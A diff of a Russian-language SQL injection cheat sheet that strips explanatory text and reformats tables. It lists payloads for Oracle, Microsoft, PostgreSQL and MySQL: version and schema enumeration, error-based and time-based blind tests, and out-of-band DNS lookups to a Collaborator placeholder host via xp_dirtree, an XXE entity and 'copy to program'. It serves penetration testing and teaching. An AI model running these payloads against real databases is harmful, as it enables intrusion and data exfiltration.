@@ -10,8 +10,6 @@
 
 ## Подстрока
 
-Вы можете извлечь часть строки, начиная с указанного смещения и указанной длины. Обратите внимание, что индекс смещения начинается с 1. Каждое из следующих выражений вернёт строку `ba`.
-
 | СУБД | Синтаксис |
 |------|-----------|
 | Oracle | `SUBSTR('foobar', 4, 2)` |
@@ -20,8 +18,6 @@
 | MySQL | `SUBSTRING('foobar', 4, 2)` |
 
 ## Комментарии
-
-Вы можете использовать комментарии, чтобы усечь запрос и удалить часть исходного запроса, следующую за вашим вводом.
 
 | СУБД | Синтаксис |
 |------|-----------|
@@ -42,8 +38,6 @@
 
 ## Версия базы данных
 
-Вы можете запросить базу данных, чтобы определить её тип и версию. Эта информация полезна при формулировании более сложных атак.
-
 | СУБД       | Синтаксис                                                          |
 | ---------- | ------------------------------------------------------------------ |
 | Oracle     | `SELECT banner FROM v$version`<br>`SELECT version FROM v$instance` |
@@ -52,8 +46,6 @@
 | MySQL      | `SELECT @@version`                                                 |
 
 ## Содержимое базы данных
-
-Вы можете перечислить таблицы, существующие в базе данных, и столбцы, которые эти таблицы содержат.
 
 | СУБД | Синтаксис |
 |------|-----------|
@@ -64,18 +56,14 @@
 
 ## Условные ошибки
 
-Вы можете проверить одно булево условие и вызвать ошибку базы данных, если условие истинно.
-
-| СУБД | Синтаксис |
-|------|-----------|
-| Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
-| Microsoft | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
-| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)` |
-| MySQL | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |
+| СУБД       | Синтаксис                                                                               |
+| ---------- | --------------------------------------------------------------------------------------- |
+| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`      |
+| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`                         |
+| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`          |
+| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |
 
 ## Извлечение данных через видимые сообщения об ошибках
-
-Вы можете потенциально вызвать сообщения об ошибках, которые раскрывают конфиденциальные данные, возвращаемые вашим вредоносным запросом.
 
 | СУБД | Синтаксис |
 |------|-----------|
@@ -100,40 +88,33 @@
 
 ## Временные задержки
 
-Вы можете вызвать временную задержку в базе данных при обработке запроса. Следующее вызовет безусловную временную задержку в 10 секунд.
-
-| СУБД | Синтаксис |
-|------|-----------|
-| Oracle | `dbms_pipe.receive_message(('a'),10)` |
-| Microsoft | `WAITFOR DELAY '0:0:10'` |
-| PostgreSQL | `SELECT pg_sleep(10)` |
-| MySQL | `SELECT SLEEP(10)` |
+| СУБД       | Синтаксис                             |
+| ---------- | ------------------------------------- |
+| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
+| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
+| PostgreSQL | `SELECT pg_sleep(10)`                 |
+| MySQL      | `SELECT SLEEP(10)`                    |
 
 ## Условные временные задержки
 
-Вы можете проверить одно булево условие и вызвать временную задержку, если условие истинно.
-
-| СУБД | Синтаксис |
-|------|-----------|
-| Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
-| Microsoft | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'` |
-| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
-| MySQL | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')` |
+| СУБД       | Синтаксис                                                                                                        |
+| ---------- | ---------------------------------------------------------------------------------------------------------------- |
+| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
+| Microsoft  | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`                                                                |
+| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`                                  |
+| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`                                                                   |
 
 ## DNS-запрос
 
-Вы можете заставить базу данных выполнить DNS-запрос к внешнему домену. Для этого вам нужно использовать Burp Collaborator, чтобы сгенерировать уникальный поддомен Burp Collaborator, который вы будете использовать в своей атаке, а затем опросить сервер Collaborator, чтобы подтвердить, что DNS-запрос произошёл.
 
-| СУБД | Синтаксис |
-|------|-----------|
-| Oracle | Уязвимость (XXE) для вызова DNS-запроса. Уязвимость была исправлена, но существует множество неисправленных установок Oracle:<br>`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`<br>Следующая техника работает на полностью исправленных установках Oracle, но требует повышенных привилегий:<br>`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |
-| Microsoft | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'` |
-| PostgreSQL | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'` |
-| MySQL | Следующие техники работают только на Windows:<br>`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`<br>`SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` |
+| СУБД       | Синтаксис                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
+| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Oracle     | Уязвимость (XXE) для вызова DNS-запроса. Уязвимость была исправлена, но существует множество неисправленных установок Oracle:<br>`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`<br>Следующая техника работает на полностью исправленных установках Oracle, но требует повышенных привилегий:<br>`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |
+| Microsoft  | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`                                                                                                                                                                                                                                                                                                                                                                                                                                             |
+| PostgreSQL | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`                                                                                                                                                                                                                                                                                                                                                                                                                                    |
+| MySQL      | Следующие техники работают только на Windows:<br>`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`<br>`SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`                                                                                                                                                                                                                                                                                                                                     |
 
 ## DNS-запрос с эксфильтрацией данных
-
-Вы можете заставить базу данных выполнить DNS-запрос к внешнему домену, содержащему результаты внедрённого запроса. Для этого вам нужно использовать Burp Collaborator, чтобы сгенерировать уникальный поддомен Burp Collaborator, который вы будете использовать в своей атаке, а затем опросить сервер Collaborator, чтобы получить детали любых DNS-взаимодействий, включая эксфильтрированные данные.
 
 | СУБД       | Синтаксис                                                                                                                                                                                                                                                                                                                                   |
 | ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
